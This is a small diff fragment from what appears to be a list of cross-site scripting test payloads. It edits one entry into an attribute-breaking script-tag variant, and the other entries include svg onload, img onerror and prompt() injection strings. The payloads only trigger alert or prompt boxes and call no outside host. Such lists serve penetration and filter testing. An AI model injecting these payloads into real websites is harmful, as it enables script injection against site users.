@@ -4,7 +4,7 @@
 - "-prompt(8)-"
 - '-prompt(8)-'
 - ";a=prompt,a()//
-- `<script>alert(1)</script>`
+- "><script>alert(1)</script>`
 - `<script src=javascript:alert(1)>
 - "><svg onload=alert(1)>
 - <img src=1 onerror=alert(1)>
